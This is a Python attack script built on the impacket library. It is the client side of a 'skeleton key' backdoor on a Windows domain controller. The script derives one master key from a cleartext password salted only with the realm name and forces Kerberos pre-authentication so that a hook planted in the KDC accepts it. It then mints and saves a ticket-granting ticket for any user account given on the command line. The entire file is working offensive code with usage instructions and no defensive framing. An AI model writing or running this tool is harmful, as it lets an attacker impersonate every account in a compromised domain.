#!/usr/bin/env python3
"""
skel_gettgt.py — mint a TGT with the skeleton MASTER PASSWORD (cleartext).

Always sends PA-ENC-TIMESTAMP pre-auth (unlike impacket's getKerberosTGT,
which skips pre-auth when the KDC reports it as not-required). This matters:
the adaptive skeleton hook only triggers on a KDC_ERR_PREAUTH_FAILED, and the
Windows KDC still verifies supplied pre-auth even on "no-pre-auth" accounts —
so forcing pre-auth makes the master password work for EVERY account.

Usage:
    python3 skel_gettgt.py <password> <domain> <user> <dc-ip> [etype]
      etype defaults to trying 18 (AES-256) then 17 (AES-128).
Saves: <user>.ccache  ->  export KRB5CCNAME=$PWD/<user>.ccache
"""
import sys, datetime, random, hashlib
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, seq_set, seq_set_iter
from impacket.krb5.asn1 import (AS_REQ, AS_REP, EncryptedData, PA_ENC_TS_ENC,
                                EncASRepPart, KERB_PA_PAC_REQUEST)
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.krb5.crypto import _enctype_table, Key, InvalidChecksum
from impacket.krb5.ccache import CCache
from pyasn1.codec.ber import encoder, decoder
from pyasn1.type.univ import noValue

NT = constants.PrincipalNameType.NT_PRINCIPAL.value

def forced_TGT(user, realm, dcip, aesKey, etype):
    """AS-REQ with PA-ENC-TIMESTAMP pre-auth, returns (tgt, cipher, key, sessionKey)
    — same 4-tuple shape as impacket's getKerberosTGT."""
    clientName = Principal(user, type=NT)
    serverName = Principal('krbtgt/%s' % realm, type=NT)
    cipher = _enctype_table[etype]
    key = Key(etype, aesKey)

    pacRequest = KERB_PA_PAC_REQUEST()
    pacRequest['include-pac'] = True
    encodedPacRequest = encoder.encode(pacRequest)

    ts = PA_ENC_TS_ENC()
    now = datetime.datetime.now(datetime.timezone.utc)
    ts['patimestamp'] = KerberosTime.to_asn1(now)
    ts['pausec'] = now.microsecond
    encTs = cipher.encrypt(key, 1, encoder.encode(ts), None)
    ed = EncryptedData(); ed['etype'] = etype; ed['cipher'] = encTs

    asReq = AS_REQ()
    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    asReq['padata'] = noValue
    asReq['padata'][0] = noValue
    asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
    asReq['padata'][0]['padata-value'] = encoder.encode(ed)
    asReq['padata'][1] = noValue
    asReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    asReq['padata'][1]['padata-value'] = encodedPacRequest

    reqBody = seq_set(asReq, 'req-body')
    opts = [constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value]
    reqBody['kdc-options'] = constants.encodeFlags(opts)
    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    seq_set(reqBody, 'cname', clientName.components_to_asn1)
    reqBody['realm'] = realm
    d = now + datetime.timedelta(days=1)
    reqBody['till'] = KerberosTime.to_asn1(d)
    reqBody['rtime'] = KerberosTime.to_asn1(d)
    reqBody['nonce'] = random.getrandbits(31)
    seq_set_iter(reqBody, 'etype', (etype,))

    tgt = sendReceive(encoder.encode(asReq), realm, dcip)
    asRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

    cipherText = asRep['enc-part']['cipher']
    plainText = cipher.decrypt(key, 3, cipherText)
    encASRepPart = decoder.decode(plainText, asn1Spec=EncASRepPart())[0]
    cipher2 = _enctype_table[encASRepPart['key']['keytype']]
    sessionKey = Key(cipher2.enctype, encASRepPart['key']['keyvalue'].asOctets())
    return tgt, cipher2, key, sessionKey

def main():
    if len(sys.argv) < 5:
        print(__doc__)
        return 2
    pw, domain, user, dcip = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    etypes = [18, 17] if len(sys.argv) < 6 else [int(sys.argv[5])]
    realm = domain.upper()
    # FIXED-KEY (v8): salt = realm only (no account name) so there is ONE
    # master key for every account. Plain PBKDF2-HMAC-SHA1 (NOT impacket's
    # string_to_key, which adds a DK(...,"kerberos") step) — the hook feeds the
    # raw PBKDF2 key straight to DeriveSpecificKey, so the client must match.
    salt = realm
    iterations = 4096
    ccache_name = user + '.ccache'

    for et in etypes:
        keysize = _enctype_table[et].keysize
        aesKey = hashlib.pbkdf2_hmac('sha1', pw.encode('utf-8'), salt.encode('utf-8'),
                                     iterations, keysize)
        print(f"[*] etype {et} ({keysize*8}-bit) key = {aesKey.hex()}")
        for attempt in (1, 2):
            try:
                tgt, cipher, key, sessionKey = forced_TGT(user, realm, dcip, aesKey, et)
                ccache = CCache()
                ccache.fromTGT(tgt, key, sessionKey)
                ccache.saveFile(ccache_name)
                print(f"[+] TGT saved -> {ccache_name} (etype {et}, attempt {attempt})")
                return 0
            except KerberosError as e:
                print(f"[-] etype {et} attempt {attempt}: {e.getErrorString()}")
            except InvalidChecksum as e:
                print(f"[-] etype {et} attempt {attempt}: {e}")
    print("[-] failed to obtain TGT")
    return 1

if __name__ == '__main__':
    sys.exit(main())
